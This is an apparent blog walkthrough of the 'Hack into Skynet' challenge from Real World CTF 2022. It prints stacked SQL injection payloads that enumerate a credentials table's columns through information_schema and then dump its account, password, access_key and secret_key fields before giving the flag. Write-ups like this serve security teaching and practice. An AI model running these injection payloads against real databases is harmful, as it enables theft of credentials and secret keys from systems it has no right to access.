# :game_die: Hack into Skynet - Real World CTF (2022) walkthrough

---

### Backend DB Identification:

It’s previously noticed while doing code analysis.

*Hope you understand*

### SQLi Confirmation

Since we found table “target_credentials” from the attachment code, it’s easy to trigger the valid payload.

Tested Payloads (Valid):

```
'; select * from target_credentials limit 1 offset '1'; select * from target_credentials limit 1 offset '2'; select * from target_credentials limit 1 offset '3....etc. up to'; select * from target_credentials limit 1 offset '12
```

### All those “up to 12” returns the values & the next part is our signature move.

```
'; select column_name, null from information_schema.columns where table_name='target_credentials' limit 1 offset '1Query returns ⇣⇣⇣account: None'; select column_name, null from information_schema.columns where table_name='target_credentials' limit 1 offset '2Query returns ⇣⇣⇣password: None'; select column_name, null from information_schema.columns where table_name='target_credentials' limit 1 offset '3Query returns ⇣⇣⇣access_key: None'; select column_name, null from information_schema.columns where table_name='target_credentials' limit 1 offset '4Query returns ⇣⇣⇣secret_key: None
```

>

So we got,

1 = account
2 = password
3 = access_key
4 = secret_key

eg:

## Get 7h3h4ckv157’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

‘; select column_name, null from information_schema.columns where table_name=’target_credentials’ limit 1 offset ‘4

*4 = secret_key*

So we understand what to provide in upcoming steps.

### The Finisher move

>

1 = account

‘; select account, null from target_credentials limit 4 offset ‘0

>

2= password

‘; select password, null from target_credentials limit 4 offset ‘0

>

3 = access_key

‘; select access_key, null from target_credentials limit 4 offset ‘0

>

4 = secret_key

‘; select secret_key, null from target_credentials limit 4 offset ‘0

*Boom !!*

>

Yaay..!!
Finally, we pwned the Skynet.

>

Flag: rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}

---
